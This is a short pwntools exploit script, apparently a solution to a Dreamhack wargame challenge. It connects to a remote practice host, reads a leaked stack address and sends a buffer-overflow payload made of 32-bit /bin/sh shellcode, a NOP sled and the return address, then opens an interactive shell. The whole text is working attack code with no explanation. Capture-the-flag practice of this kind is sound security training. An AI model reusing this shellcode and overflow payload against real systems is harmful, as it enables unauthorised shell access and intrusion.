

from pwn import *

p = remote("host3.dreamhack.games", 23148)	# 원격 서버 접속

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

buf = int(p.recv()[7:17], 16)	

payload = shellcode				
payload += b"\x90"*106			
payload += p32(buf)				

p.sendline(payload)	
p.interactive()	   